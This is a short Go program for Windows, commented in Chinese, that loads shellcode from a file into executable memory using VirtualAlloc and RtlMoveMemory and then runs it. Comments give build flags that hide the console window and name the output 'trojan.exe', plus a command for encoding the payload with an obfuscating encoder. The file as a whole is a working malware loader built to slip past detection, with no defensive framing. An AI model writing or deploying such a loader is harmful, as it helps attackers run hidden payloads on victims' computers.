//go:build windows
// +build windows

package main

import (
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// 读取shellcode
	shellcode, err := os.ReadFile("shellcode.bin")
	if err != nil {
		return
	}
	// 获取windows api
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	// 申请内存的api
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// 拷贝shellcode到指定内存的Windows api
	RtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	// 申请内存
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000, 0x40)
	// 复制shellcode到指定内存
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	// 运行内存中的shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)

	// GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o trojan.exe main.go
}

// sgn -a 64 -c 1 -o p1.bin payload.bin
